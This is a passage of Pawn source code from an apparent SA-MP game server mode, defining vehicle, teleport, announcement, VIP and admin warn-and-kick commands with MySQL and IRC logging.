	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /tires <Frontleft: 0/1> <FrontRight: 0/1> <RearLeft: 0/1> <RearRight: 0/1> [0: Inflated, 1: Popped]");

	tmps2 = strtok(params, idx);
	tire4 = strval(tmps2);
	if (!strlen(tmps2) || tire4 < 0 || tire4 > 1)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /tires <Frontleft: 0/1> <FrontRight: 0/1> <RearLeft: 0/1> <RearRight: 0/1> [0: Inflated, 1: Popped]");

	new vID = GetPlayerVehicleID(playerid),
		panels, doors, lights, tires;

	GetVehicleDamageStatus(vID, panels, doors, lights, tires);
	tires = encode_tires(tire4, tire2, tire3, tire1); // adjusted so first param = first wheel on the left
	UpdateVehicleDamageStatus(vID, panels, doors, lights, tires);
	return 1;
}

dcmd_wreck(playerid,params[])
{
	#pragma unused params

 	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	if (!AntiSpam(playerid, 2)) return 1;

	new vID = GetPlayerVehicleID(playerid),
		panels, doors, lights, tires;

	GetVehicleDamageStatus(vID, panels, doors, lights, tires);
	lights = encode_lights(1, 1, 1, 1);
	tires = encode_tires(1, 1, 1, 1);
	doors = encode_doors(door_fell_off, door_fell_off, door_fell_off, door_fell_off, door_fell_off, door_fell_off);
	panels = encode_panels(windshielddestroyed, windshielddestroyed, windshielddestroyed, windshielddestroyed, windshielddestroyed, windshielddestroyed, windshielddestroyed);
	UpdateVehicleDamageStatus(vID, panels, doors, lights, tires);
	return 1;
}

dcmd_tow(playerid,params[])
{
 	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	new vID = GetPlayerVehicleID(playerid);
	if (IsTrailerAttachedToVehicle(vID))
	return DetachTrailerFromVehicle(vID);

	new idx;

	strings = strtok(params,idx);
	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /tow <vehicleid>");
	new vehicleid = strval(strings);

	if (!GetVehicleModel(vehicleid) || vehicleid < GAMEMODE_VEHICLES)
	return SendErrorMessage(playerid, EMBED_WHITE, "This vehicle does not exist.");

	if (!AntiSpam(playerid, 2)) return 1;

	if (vID == vehicleid)
	return SendErrorMessage(playerid, EMBED_WHITE, "You can't tow your own vehicle!");

	new Float:vX, Float:vY, Float:vZ;
	GetVehiclePos(vID,  playerxyza[0], playerxyza[1], playerxyza[2]);
	GetVehiclePos(vehicleid, vX, vY, vZ);

	if  ((floatabs(playerxyza[0]-vX) < 7.0) && (floatabs(playerxyza[1]-vY) < 7.0) && (floatabs(playerxyza[2]-vZ) < 7.0))
	AttachTrailerToVehicle(vehicleid, vID);
	else SendErrorMessage(playerid, EMBED_WHITE, "This vehicle is too far away.");
	return 1;
}

dcmd_setveh(playerid,params[])
{
	if (IsPlayerDriver(playerid))
	{
	    new idx,
			engine,
			lights,
			alarm,
			doors,
			bonnet,
			boot,
			objective,
			vID = GetPlayerVehicleID(playerid);

		GetVehicleParamsEx(vID, engine, lights, alarm, doors, bonnet, boot, objective);
		if (IsVIP(playerid))
		{
			tmps2 = strtok(params, idx);
			engine = strval(tmps2);
			if (!strlen(tmps2) || engine < 0 || engine > 1)
			return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setveh(icle) <Engine:0/1> <Lights:0/1> <Alarm:0/1> <DoorsLocked:0/1> <Bonnet:0/1> <Boot:0/1> <Objective:0/1> [0: Off, 1: On]");

			tmps2 = strtok(params, idx);
			if (strlen(tmps2))
			{
				lights = strval(tmps2);
				if (lights < 0 || lights > 1)
				return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setveh(icle) <Engine:0/1> <Lights:0/1> <Alarm:0/1> <DoorsLocked:0/1> <Bonnet:0/1> <Boot:0/1> <Objective:0/1> [0: Off, 1: On]");
			}

			tmps2 = strtok(params, idx);
			if (strlen(tmps2))
			{
				alarm = strval(tmps2);
				if (alarm < 0 || alarm > 1)
				return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setveh(icle) <Engine:0/1> <Lights:0/1> <Alarm:0/1> <DoorsLocked:0/1> <Bonnet:0/1> <Boot:0/1> <Objective:0/1> [0: Off, 1: On]");
			}

			tmps2 = strtok(params, idx);
			if (strlen(tmps2))
			{
				doors = strval(tmps2);
				if (doors < 0 || doors > 1)
				return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setveh(icle) <Engine:0/1> <Lights:0/1> <Alarm:0/1> <DoorsLocked:0/1> <Bonnet:0/1> <Boot:0/1> <Objective:0/1> [0: Off, 1: On]");
			}

			tmps2 = strtok(params, idx);
			if (strlen(tmps2))
			{
				bonnet = strval(tmps2);
				if (bonnet < 0 || bonnet > 1)
				return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setveh(icle) <Engine:0/1> <Lights:0/1> <Alarm:0/1> <DoorsLocked:0/1> <Bonnet:0/1> <Boot:0/1> <Objective:0/1> [0: Off, 1: On]");
			}

			tmps2 = strtok(params, idx);
			if (strlen(tmps2))
			{
				boot = strval(tmps2);
				if (boot < 0 || boot > 1)
				return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setveh(icle) <Engine:0/1> <Lights:0/1> <Alarm:0/1> <DoorsLocked:0/1> <Bonnet:0/1> <Boot:0/1> <Objective:0/1> [0: Off, 1: On]");
			}

			tmps2 = strtok(params, idx);
			if (strlen(tmps2))
			{
				objective = strval(tmps2);
				if (objective < 0 || objective > 1)
				return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setveh(icle) <Engine:0/1> <Lights:0/1> <Alarm:0/1> <DoorsLocked:0/1> <Bonnet:0/1> <Boot:0/1> <Objective:0/1> [0: Off, 1: On]");
			}
			//vehicle[vID][Objective] = objective;

			SetVehicleParamsEx(vID, engine, lights, alarm, doors, bonnet, boot, objective);
			vehicle[vID][Objective] = objective;

			/*for (new allseearrow = 0; allseearrow < MAX_PLAYERS; allseearrow++)
	    	SetVehicleParamsForPlayerEx(vID, allseearrow, objective, vehicle[vID][Locked]);*/
		} else {
			tmps2 = strtok(params, idx);
			lights = strval(tmps2);
			if (!strlen(tmps2) || lights < 0 || lights > 1)
			return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setveh(icle) <Lights:0/1> <Bonnet:0/1> <Boot:0/1> [0: Off, 1: On] [Premium users: 4 more options available]");

			tmps2 = strtok(params, idx);
			if (strlen(tmps2))
			{
				bonnet = strval(tmps2);
				if (bonnet < 0 || bonnet > 1)
				return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setveh(icle) <Lights:0/1> <Bonnet:0/1> <Boot:0/1> [0: Off, 1: On] [Premium users: 4 more options available]");
			}

			tmps2 = strtok(params, idx);
			if (strlen(tmps2))
			{
				boot = strval(tmps2);
				if (boot < 0 || boot > 1)
				return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setveh(icle) <Lights:0/1> <Bonnet:0/1> <Boot:0/1> [0: Off, 1: On] [Premium users: 4 more options available]");
			}

			SetVehicleParamsEx(vID, engine, lights, alarm, doors, bonnet, boot, objective);
		}
	} else SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle.");
 	return 1;
}

dcmd_setvehicle(playerid,params[])
return dcmd_setveh(playerid,params);

dcmd_bind(playerid,params[])
{
	#pragma unused params
	
	ShowPlayerDialog(playerid, DIALOGID_KEYBINDS, DIALOG_STYLE_LIST, "Available keybinds", "0\tOff\n1\tFlip\n2\tJump\n3\tSjump\n4\tHjump\n5\tMovespeed\n6\tLights\n7\tNitro\n8\tCarcolour\n9\tPaintjob\n10\tBonnet\n11\tBoot\n12\tReverse\n13\tObjective", "Select", "Close");
	return 1;
}

dcmd_stealth(playerid,params[])
{
	#pragma unused params

	player[playerid][gotomode] = 0;
	player[playerid][disablepm] = 1;
	SetPlayerColor(playerid, COLOR_INVISIBLE);
    SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Stealth mode has been activated.");
	return 1;
}

dcmd_minigames(playerid,params[])
{
	#pragma unused params

	new minigamesStr[210] = ""EMBED_LIME"Minigame\t\tTime left\tStatus\n",
		timeleftStr[14],
		statusStr[7];

	if (dmlocked == true)    	statusStr = "Locked";
	else 						statusStr = "Open";
	format(minigamesStr, sizeof(minigamesStr), "%sDeathmatch\t\tNo time limit\t%s\n", minigamesStr, statusStr);

	if (derbystarted == true)	timeleftStr = "Started";
	else 						timeleftStr = "Not started";
	if (derbylocked == true)    statusStr = "Locked";
	else 						statusStr = "Open";
	format(minigamesStr, sizeof(minigamesStr), "%sDerby\t\t\t%s\t%s\n", minigamesStr, timeleftStr, statusStr);

	if (rrstarted == true)		timeleftStr = "Started";
	else 						timeleftStr = "Not started";
	if (rrlocked == true)    	statusStr = "Locked";
	else 						statusStr = "Open";
	format(minigamesStr, sizeof(minigamesStr), "%sRussian Roulette\t%s\t%s\n", minigamesStr, timeleftStr, statusStr);

	if (ccstarted == true)		format(timeleftStr, sizeof(timeleftStr), "%d min(s)\t", (ccsecondslefttillend/60)+1);
	else 						timeleftStr = "Not started";
	if (cclocked == true)    	statusStr = "Locked";
	else 						statusStr = "Open";
	format(minigamesStr, sizeof(minigamesStr), "%sCop chase\t\t%s\t%s\n", minigamesStr, timeleftStr, statusStr);
	
	if (nbstarted == true)		timeleftStr = "Started";
	else 						timeleftStr = "Not started";
	if (nbblocked == true)    	statusStr = "Locked";
	else 						statusStr = "Open";
	format(minigamesStr, sizeof(minigamesStr), "%sNadeball\t\t%s\t%s\n", minigamesStr, timeleftStr, statusStr);
	
	if (warzonestarted == true)	format(timeleftStr, sizeof(timeleftStr), "%d min(s)\t", (warzoneminuteslefttillend/60)+1);
	else 						timeleftStr = "Not started";
	if (wzlocked == true)  		statusStr = "Locked";
	else 						statusStr = "Open";
	format(minigamesStr, sizeof(minigamesStr), "%sWarzone\t\t%s\t%s", minigamesStr, timeleftStr, statusStr);

	ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_LIST, "Minigames Status", minigamesStr, "Close", "");
	return 1;
}

dcmd_vhelp(playerid,params[])
{
	#pragma unused params
	return SendErrorMessage(playerid, EMBED_WHITE, "This command was removed. Please type /help to see all the commands.");
	/*new idx;

	strings = strtok(params,idx);
	if (!strlen(strings) || strval(strings) < 1 || strval(strings) > 3)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /vhelp <1-3>");

	switch(strval(strings)) {
 	case 1: {
			SendClientMessage(playerid, COLOR_BLACK, "_____________________ P1: VIP Commands:_____________________");
			SendClientMessage(playerid, COLOR_LIME, "| /bring <n|id> - Brings you the person");
			SendClientMessage(playerid, COLOR_LIME, "| /strew <distance> - Attach street under your ass");
			SendClientMessage(playerid, COLOR_LIME, "| /acc - Automatic Vehicle Color Change");
			SendClientMessage(playerid, COLOR_LIME, "| /apc - Automatic Player Color Change");
			SendClientMessage(playerid, COLOR_LIME, "| /odrop <id objectid amount> - drop objects on player");
			SendClientMessage(playerid, COLOR_LIME, "| /a|v/ve|o|jclear - Clear All/(empty)vehicles|objects|jetpacks");
  			SendClientMessage(playerid, COLOR_LIME, "| /removestick <n|id/all> - Remove player's osticks");
			SendClientMessage(playerid, COLOR_LIME, "| /count(down) - Countdown from 5.");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯ For more commands type /vhelp 2 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
			return 1;
	        }
    case 2: {
			SendClientMessage(playerid, COLOR_BLACK, "_____________________ P2: VIP Commands:_____________________");
			SendClientMessage(playerid, COLOR_LIME, "| /sett(ime) <timeid>- Set the time [0-23]");
			SendClientMessage(playerid, COLOR_LIME, "| /setw(eather) <weatherid> - Set the weather [0-45]");
			SendClientMessage(playerid, COLOR_LIME, "| /setskin <n|id> <skin> - Set player's skin");
			SendClientMessage(playerid, COLOR_LIME, "| /set|givemoney <n|id> <amount> - Set/Give money");
			SendClientMessage(playerid, COLOR_LIME, "| /object <gc/set/rot/move> - Set/Rotate/Move object");
			SendClientMessage(playerid, COLOR_LIME, "| /vdestroy - Destroy a vehicle");
			SendClientMessage(playerid, COLOR_LIME, "| /sc|sp - Save/Bring (saved) vehicle");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯ For more commands type /vhelp 3 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
			return 1;
	        }
   case 3: {
			SendClientMessage(playerid, COLOR_BLACK, "_____________________ P3: VIP Commands:_____________________");
			SendClientMessage(playerid, COLOR_LIME, "| /papc/pacc » Enable/Disable player/vehicle color changing");
			SendClientMessage(playerid, COLOR_LIME, "| /resetandromada - Reset andromada status");
 			SendClientMessage(playerid, COLOR_LIME, "| /s(kip)aclear - Skip next automatic aclear");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
			return 1;
	        }
	}
	return 1;*/
}

dcmd_bring(playerid, params[]) // Simon
{
	new idx,
		Float:X,
	 	Float:Y,
	 	Float:Z,
	 	Float:A,
		Interior = GetPlayerInterior(playerid);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /bring <name|id> (X_OFFSET Y_OFFSET Z_OFFSET)");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (!IsPlayerConnected(giveplayerid) || giveplayerid == INVALID_PLAYER_ID)
	return SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");

	if (!IsAdmin(playerid) && IsAdmin(giveplayerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "Cannot bring an admin");

	if (!IsPlayerSpawned(giveplayerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

	if (player[giveplayerid][playingdm] == 1 || player[giveplayerid][playingderby] == 1 || player[giveplayerid][playingrr] == 1 || player[giveplayerid][playingcc] == 1 || player[giveplayerid][playingnb] == 1 || player[giveplayerid][playingwarzone] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "This player is currently in a deathmatch.");

	if (player[giveplayerid][specdm] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "This player is currently spectating a dm");

	if (player[giveplayerid][Spectating] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "This player is currently spectating");

	GetPlayerPos(playerid, X, Y, Z);
	GetPlayerFacingAngle(playerid, A);
	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	{
 		GetXYInFrontOfPlayer(playerid, X, Y, 1.5);
        SetPlayerPosEx(giveplayerid, X, Y, Z, A, Interior);

        GetPlayerName(giveplayerid, tmps2, sizeof(tmps2));
		format(strings, sizeof(strings), "[SUCCESS]: You have brought %s (ID: %d) to you.", tmps2, giveplayerid);
		SendClientMessage(playerid, COLOR_IVORY, strings);

		GetPlayerName(playerid, tmps2, sizeof(tmps2));
		format(strings, sizeof(strings), "%s (ID: %d) has brought you.", tmps2, playerid);
		SendClientMessage(giveplayerid, COLOR_IVORY, strings);

		SendCommandMessageToAdmins(playerid, "bring");
	    return 1;
	}

	X += floatstr(tmps2);
	tmps2 = strtok(params, idx);

	if (!strlen(tmps2)) {
	    goto fbring;
	}

	Y += floatstr(tmps2);
	tmps2 = strtok(params, idx);

	if (!strlen(tmps2)) {
	    goto fbring;
	}

	Z += floatstr(tmps2);

	fbring:
	if (X > 3000 || X < -3000 || Y > 3000 || Y < -3000 || Z > 3000 || Z < -3000)
	return SendErrorMessage(playerid, EMBED_WHITE, "Coordinates out of bounds.");
	
	SetPlayerPosEx(giveplayerid, X, Y, Z, A, Interior);

	GetPlayerName(giveplayerid, tmps2, sizeof(tmps2));
	format(strings, sizeof(strings), "[SUCCESS]: You have brought %s (ID: %d) to you.", tmps2, giveplayerid);
	SendClientMessage(playerid, COLOR_IVORY, strings);

	GetPlayerName(playerid, tmps2, sizeof(tmps2));
	format(strings, sizeof(strings), "%s (ID: %d) has brought you.", tmps2, playerid);
	SendClientMessage(giveplayerid, COLOR_IVORY, strings);

	SendCommandMessageToAdmins(playerid, "bring");
	return 1;
}

dcmd_strew(playerid,params[])
{
	new idx,
		Float:distance;

	if (player[playerid][strew] == 1)
	{
		player[playerid][strew] = 0;
		KillTimer(player[playerid][aftimer]);
		SendClientMessage(playerid,COLOR_GOLD, "Strew DISABLED");
		DestroyPlayerObject(playerid, player[playerid][strewid]);
		player[playerid][strewid] = -1;
	} else {
		if (!IsPlayerDriver(playerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

		tmps2 = strtok(params, idx);
		if (!strlen(tmps2))
		return SendClientMessage(playerid,COLOR_AQUA, "[USAGE]: /strew <Float:distance under vehicle> (0.7 is standard value for Infernus)");
		distance = floatstr(tmps2);

		player[playerid][strew] = 1;
		player[playerid][strewdist] = distance;
 		player[playerid][aftimer] = SetTimerEx("AutoFlip", 7500,1, "i", playerid);
		SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Strew ENABLED");
	}
	SendCommandMessageToAdmins(playerid, "strew");
	return 1;
}

dcmd_say(playerid, params[])
{
	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

	if (strlen(params) < 1)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /say <message>");

 	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "say %s: %s", playername, params);
	SendRconCommand(strings);
	SendCommandMessageToAdmins(playerid, "say");
	format(strings, sizeof(strings), "6(SAY) %s: %s", playername, params);
	IRC_GroupSay(1, IRC_CHANNEL, strings);
	return 1;
}

dcmd_pannounce(playerid, params[])
{
	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

	new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /pannounce <playerid> <message>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (!strlen(params[strlen(tmps2)+1]) || strlen(params[strlen(tmps2)+1]) > 100)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /pannounce <playerid> <message> [Max. 100 characters]");

	if (!issafefortextdraw(params[strlen(tmps2)+1]))
	return SendErrorMessage(playerid, EMBED_WHITE, "There seems to be an incorrect input of a tilde tag (~ symbol)!");

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		SendCommandMessageToAdmins(playerid, "pannounce"); // show first incase an admin tries to abuse-crash people
		GameTextForPlayer(giveplayerid, params[strlen(tmps2)+1], 6000, 3);
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_announce(playerid, params[])
{
	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

	if (!strlen(params) || strlen(params) > 100)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /announce <message> [Max. 100 characters]");

	if (!issafefortextdraw(params))
	return SendErrorMessage(playerid, EMBED_WHITE, "There seems to be an incorrect input of a tilde tag (~ symbol)!");

	SendCommandMessageToAdmins(playerid, "announce"); // show first incase an admin tries to abuse-crash people
	GameTextForAll(params, 6000, 3);
	return 1;
}

dcmd_cannounce(playerid, params[])
{
	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

	if (!strlen(params) || strlen(params) > 100)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /cannounce <message> [Max. 100 characters]");

	if (!issafefortextdraw(params))
	return SendErrorMessage(playerid, EMBED_WHITE, "There seems to be an incorrect input of a tilde tag (~ symbol)!");

	SendCommandMessageToAdmins(playerid, "cannounce"); // show first incase an admin tries to abuse-crash people
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
 		if (IsPlayerConnected(i) && !IsPlayerInAnyCrew(i))
		GameTextForPlayer(i, params, 6000, 3);
	}
	return 1;
}

dcmd_apc(playerid,params[])
{
	#pragma unused params

	GetPlayerName(playerid, playername, sizeof(playername));
	if (IsAdmin(playerid))
	{
		if (autoplayercolor == true)
		{
			autoplayercolor = false;
			format(strings, sizeof(strings), "Admin %s "EMBED_RED"DISABLED"EMBED_WHITE" Player Auto-Color Change.", playername);
		} else {
			autoplayercolor = true;
			format(strings, sizeof(strings), "Admin %s "EMBED_GREEN"ENABLED"EMBED_WHITE" Player Auto-Color Change.", playername);
		}
	} else {
		if (autoplayercolor == true)
		{
			autoplayercolor = false;
			format(strings, sizeof(strings), "VIP %s has "EMBED_RED"DISABLED"EMBED_WHITE" Player Auto-Color Change.", playername);
		} else {
			autoplayercolor = true;
			format(strings, sizeof(strings), "VIP %s has "EMBED_GREEN"ENABLED"EMBED_WHITE" Player Auto-Color Change.", playername);
		}
	}
	SendServerMessageToAll(EMBED_WHITE, strings);
	SendCommandMessageToAdmins(playerid, "apc");
	return 1;
}

dcmd_acc(playerid,params[])
{
	#pragma unused params

	GetPlayerName(playerid, playername, sizeof(playername));
	if (IsAdmin(playerid))
	{
		if (autovehiclecolor == true)
		{
			autovehiclecolor = false;
			format(strings, sizeof(strings), "Admin %s has "EMBED_RED"DISABLED"EMBED_WHITE" Vehicle Auto-Color Change.",playername);
		} else {
			autovehiclecolor = true;
			format(strings, sizeof(strings), "Admin %s has "EMBED_GREEN"ENABLED"EMBED_WHITE" Vehicle Auto-Color Change.",playername);
		}
	} else {
		if (autovehiclecolor == true)
		{
			autovehiclecolor = false;
			format(strings, sizeof(strings), "VIP %s has "EMBED_RED"DISABLED"EMBED_WHITE" Vehicle Auto-Color Change.",playername);
		} else {
			autovehiclecolor = true;
			format(strings, sizeof(strings), "VIP %s has "EMBED_GREEN"ENABLED"EMBED_WHITE" Vehicle Auto-Color Change.",playername);
		}
	}
	SendServerMessageToAll(EMBED_WHITE, strings);
	SendCommandMessageToAdmins(playerid, "acc");
	return 1;
}

dcmd_odrop(playerid,params[])
{
 	new idx,
 	    modelid2,
	 	Float:oX,
	 	Float:oY,
	 	Float:oZ,
	 	amount;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /odrop <name|id> <objectid> <amount max. 15>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /odrop <name|id> <objectid> <amount max. 15>");
	modelid2 = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /odrop <name|id> <objectid> <amount max. 15>");
	amount = strval(tmps2);

	if (amount <= 0 || amount > 15)
	return SendErrorMessage(playerid, EMBED_WHITE, "minimum 1, maximum 15 !");

	if (!IsValidModel(modelid2))
	return SendErrorMessage(playerid, EMBED_WHITE, "The model ID you supplied doesn't seem to be valid!");

	if (IsAdmin(playerid)) { if (!AntiSpam(playerid, 1)) return 1; }
	else if (!AntiSpam(playerid, 3)) return 1;

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

		format(strings, sizeof(strings), "Targetid: %d objectid: %d amount: %d", giveplayerid, modelid2, amount);
		SendClientMessage(playerid, COLOR_YELLOW , strings);
		for (new ses = 0; ses < amount; ses++)
		{
		    GetPlayerPos(giveplayerid,oX,oY,oZ);
		    GetXYInFrontOfPlayer(giveplayerid, oX,oY, 1.0);
			new dobject = CreateDynamicObject(modelid2, oX, oY, oZ+10, 0.0, 0.0, 0.0);
            SetTimerEx("DeleteObject",10000,0, "i",dobject);
		}
		Streamer_Update(giveplayerid);
		SetTimerEx("CreateExplosionEx",1000,0, "fffif",oX,oY,oZ +10, 12, 0.0);
		SendCommandMessageToAdmins(playerid, "odrop");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_warn(playerid,params[])
{
	new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /warn <name|id> <reason>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (giveplayerid == playerid)
	return SendErrorMessage(playerid, EMBED_WHITE, "You can't warn yourself!");

	if (!strlen(params[strlen(tmps2)+1]))
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /warn <name|id> <reason>");

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		new String[64];
	 	new player_delay = gettime() - player[playerid][delay];
		if (player_delay < 20 && player[playerid][lastwarned] == giveplayerid)
		{
			format(String, sizeof(String), "You need to wait %d seconds for this command!", 20 - player_delay);
			SendClientMessage(playerid, 0xFF0000FF, String);
			return 1;
	  	}else{
			player[playerid][delay] = gettime();
		}

		if (player[playerid][ADMIN] <  player[giveplayerid][ADMIN] || IsPlayerNPC(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

		if (playerid == giveplayerid)
		{
		    if (IsPlayerAdminLevel(playerid, 4))
		    return 1;
		}

	    if (!player[giveplayerid][RULEStextdraw])
		{
			TextDrawShowForPlayer(giveplayerid, nrules);
			player[giveplayerid][RULEStextdraw] = 1;
	    }

		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));

		if (player[playerid][hideadmin] == 1)
		{
			if (player[giveplayerid][warnings] > 0)
			{
				format(tmps1, sizeof(tmps1), "%s (id: %d) was warned and got auto-kicked. [Reason: %s] [Warnings: 2/2]", giveplayername, giveplayerid, params[strlen(tmps2)+1]);
				SendServerMessageToAll(EMBED_RED, tmps1);
				GameTextForPlayer(giveplayerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~YOU WERE AUTOMATICALLY KICKED!", 6000, 3);

				if (IsPlayerRegistered(giveplayerid) && IsPlayerLoggedIn(giveplayerid))
				{
					new mysqlStr[128];
					format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_warn_count` = player_log_warn_count +1 WHERE account_id = %d LIMIT 1", GetPlayerAccountID(giveplayerid));
					mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
				}

				KickEx(giveplayerid);
				if (player[playerid][lastwarned] == giveplayerid) player[playerid][lastwarned] = -1;
				
				//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_warns, server_statistic_kicks) VALUES (CURDATE(), 1, 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_warns` = server_statistic_warns +1, `server_statistic_kicks` = server_statistic_kicks +1", false, "", "");
			} else {
				ResetPlayerWeapons(giveplayerid);
				player[giveplayerid][warnings] = 1;
				format(tmps1, sizeof(tmps1), "%s (id: %d) was warned [Reason: %s] [Warnings: 1/2]", giveplayername, giveplayerid, params[strlen(tmps2)+1]);
				SendServerMessageToAll(EMBED_ORANGE, tmps1);
	   			GameTextForPlayer(giveplayerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~YOU WERE WARNED!", 6000, 3);
	   			player[playerid][lastwarned] = giveplayerid;
	   			
				//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_warns) VALUES (CURDATE(), 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_warns` = server_statistic_warns +1", false, "", "");
			}

			//GetPlayerName(playerid, playername, sizeof(playername));
			format(ircstring, sizeof(ircstring), "by %s", playername);
			SendMessageToAdmins(COLOR_RED, ircstring, 4);
			format(ircstring, sizeof(ircstring), "7,1%s by %s", tmps1, playername);
			IRC_GroupSay(1, IRCOP_CHANNEL, ircstring);
			printflog("ADM-MSG", ircstring);
			
		} else {
			GetPlayerName(playerid, playername, sizeof(playername));
			if (player[giveplayerid][warnings] > 0)
			{
				format(tmps1, sizeof(tmps1), "Admin %s warned %s (id: %d) and got auto-kicked. [Reason: %s] [Warnings: 2/2]", playername, giveplayername, giveplayerid, params[strlen(tmps2)+1]);
				SendServerMessageToAll(EMBED_RED, tmps1);
				GameTextForPlayer(giveplayerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~YOU WERE AUTOMATICALLY KICKED BY AN ADMIN!", 6000, 3);

				if (IsPlayerRegistered(giveplayerid) && IsPlayerLoggedIn(giveplayerid))
				{
					new mysqlStr[180];
					format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_kick_count` = player_log_kick_count +1, `player_log_warn_count` = player_log_warn_count +1 WHERE account_id = %d LIMIT 1", GetPlayerAccountID(giveplayerid));
					mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
				}

				KickEx(giveplayerid);
				if (player[playerid][lastwarned] == giveplayerid) player[playerid][lastwarned] = -1;
				
